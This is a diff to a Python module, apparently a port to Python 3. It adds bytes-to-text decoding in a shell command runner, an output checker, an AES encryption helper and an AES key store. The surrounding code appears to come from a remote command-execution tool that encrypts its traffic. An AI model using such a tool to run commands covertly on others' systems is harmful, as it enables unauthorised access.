@@ -63,6 +63,10 @@ def run_command(command):
     try:
         subp = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
         subp_output, errors = subp.communicate()
+        if isinstance(subp_output, bytes):
+            subp_output = subp_output.decode('utf-8', errors='replace')
+        if isinstance(errors, bytes):
+            errors = errors.decode('utf-8', errors='replace')
         if not errors:
             if subp_output == '':
                 return '[+] Command successfully executed.\n'
@@ -81,12 +85,19 @@ def start_command(command):
         return '[!] {}\n'.format(str(e))
 
 def no_error(cmd_output):
+    if isinstance(cmd_output, bytes):
+        try:
+            cmd_output = cmd_output.decode('utf-8')
+        except:
+            cmd_output = cmd_output.decode('latin-1')
     if cmd_output.startswith("ERROR:") or cmd_output.startswith("[!]"):
         return False
     else:
         return True
 
 def encrypt(raw, aes_key=secret):
+    if isinstance(raw, str):
+        raw = raw.encode('utf-8')
     iv = Random.new().read( AES.block_size )
     cipher = AES.new(aes_key, AES.MODE_CFB, iv )
     return (base64.b64encode( iv + cipher.encrypt( raw ) ) )
@@ -129,7 +140,7 @@ def add_aes(key):
                     if aes_lib.get(aes_abbrev,'aes_key') == key:
                         st_print('[*] The AES key has already been added to this system.\n')
                         return
-                aesfile = open(st_aes_lib,'wb')
+                aesfile = open(st_aes_lib,'w')
                 if not sec_exists:
                     aes_lib.add_section(aes_abbrev)
                 aes_lib.set(aes_abbrev, 'aes_key', key)
